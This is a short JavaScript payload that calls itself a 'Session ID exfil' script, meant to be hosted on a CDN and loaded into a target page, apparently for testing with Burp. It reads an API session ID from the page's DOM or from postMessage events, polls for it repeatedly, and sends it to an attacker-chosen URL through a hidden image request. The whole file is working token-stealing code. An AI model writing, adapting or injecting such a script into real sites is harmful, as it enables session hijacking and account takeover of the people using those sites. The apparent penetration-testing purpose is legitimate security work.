/**
 * Session ID exfil – host on your CDN/GitHub.
 * Load with ?exfil=URL and optional &from=SOURCE so Burp shows which scenario sent it.
 * Add &debug=1 to log and set window.__exfilDebug for troubleshooting.
 */
(function () {
    var script = document.currentScript;
    var exfilUrl = '';
    var fromParam = '';
    var debug = false;
    if (script && script.src) {
        try {
            var u = new URL(script.src);
            exfilUrl = u.searchParams.get('exfil') || u.searchParams.get('exfilUrl') || '';
            fromParam = u.searchParams.get('from') || '';
            debug = u.searchParams.get('debug') === '1';
        } catch (e) {}
    }
    if (debug) {
        window.__exfilDebug = { loaded: true, messageReceived: 0, exfilCalled: 0, exfilUrl: exfilUrl ? '(set)' : '(missing)' };
        console.log('[exfil] Script loaded, listening for postMessage. Check window.__exfilDebug after a few seconds.');
    }
    function exfil(sid) {
        if (!sid || !exfilUrl) return;
        if (debug) {
            window.__exfilDebug.exfilCalled++;
            console.log('[exfil] exfil() called, sid length=' + (sid && sid.length), 'Total exfilCalled:', window.__exfilDebug.exfilCalled);
        }
        try {
            var url = exfilUrl + encodeURIComponent(sid);
            if (fromParam) url += '&from=' + encodeURIComponent(fromParam);
            new Image().src = url;
        } catch (e) {
            if (debug) console.error('[exfil] exfil failed', e);
        }
    }
    function readFromDom() {
        var el = document.getElementById('apiSessionId') || document.querySelector('[data-api-session-id]');
        var sid = el ? (el.value || (el.getAttribute && el.getAttribute('data-api-session-id')) || el.textContent || '').trim() : '';
        return sid || '';
    }
    var sid = readFromDom();
    if (sid) exfil(sid);
    window.addEventListener('message', function (e) {
        if (e.data && e.data.type === 'sessionId' && e.data.value) {
            if (debug) {
                window.__exfilDebug.messageReceived++;
                console.log('[exfil] postMessage received, sid length=' + (e.data.value && String(e.data.value).length), 'Total messageReceived:', window.__exfilDebug.messageReceived);
                alert('Script received session ID from postMessage (length: ' + (sid ? sid.length : 0) + ')');
            }
            exfil(String(e.data.value).trim());
        }
    });
    var pollCount = 0;
    var poll = setInterval(function () {
        pollCount++;
        if (pollCount > 10) { clearInterval(poll); return; }
        sid = readFromDom();
        if (sid) { exfil(sid); clearInterval(poll); }
    }, 500);
})();
